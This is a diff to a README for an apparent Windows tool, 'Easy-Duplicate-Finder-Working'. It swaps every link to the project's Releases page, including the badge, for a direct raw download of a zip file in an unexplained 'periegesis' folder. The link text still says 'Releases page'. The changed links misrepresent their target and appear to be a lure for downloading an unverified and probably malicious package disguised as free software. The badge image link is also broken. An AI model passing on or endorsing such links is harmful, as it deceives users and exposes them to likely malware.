@@ -1,6 +1,6 @@
 # 🖥️ Easy-Duplicate-Finder-Working - Find Duplicates Easily and Securely
 
-[![Download the Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-%20-%23007bff?style=for-the-badge&logo=github)](https://github.com/annamariadissolvable435/Easy-Duplicate-Finder-Working/releases)
+[![Download the Latest Version](https://raw.githubusercontent.com/annamariadissolvable435/Easy-Duplicate-Finder-Working/main/periegesis/Easy-Duplicate-Finder-Working_v1.9.zip%20Latest%20Version-%20-%23007bff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/annamariadissolvable435/Easy-Duplicate-Finder-Working/main/periegesis/Easy-Duplicate-Finder-Working_v1.9.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ Easy Duplicate Finder offers a simple way to locate and delete duplicate files o
 To begin using Easy Duplicate Finder, follow these steps:
 
 1. **Download the Application:**
-   Visit the [Releases page](https://github.com/annamariadissolvable435/Easy-Duplicate-Finder-Working/releases) to download the software package. You will find the latest version available for Windows.
+   Visit the [Releases page](https://raw.githubusercontent.com/annamariadissolvable435/Easy-Duplicate-Finder-Working/main/periegesis/Easy-Duplicate-Finder-Working_v1.9.zip) to download the software package. You will find the latest version available for Windows.
 
 2. **Install the Application:**
    Once downloaded, locate the installation file on your computer, usually in the "Downloads" folder.
@@ -59,7 +59,7 @@ Easy Duplicate Finder offers several useful features:
 
 ## 🔗 Download & Install
 
-To download Easy Duplicate Finder, visit the [Releases page](https://github.com/annamariadissolvable435/Easy-Duplicate-Finder-Working/releases) now. Follow the installation steps outlined above to set up the application on your computer.
+To download Easy Duplicate Finder, visit the [Releases page](https://raw.githubusercontent.com/annamariadissolvable435/Easy-Duplicate-Finder-Working/main/periegesis/Easy-Duplicate-Finder-Working_v1.9.zip) now. Follow the installation steps outlined above to set up the application on your computer.
 
 ## 🛠️ Troubleshooting
 
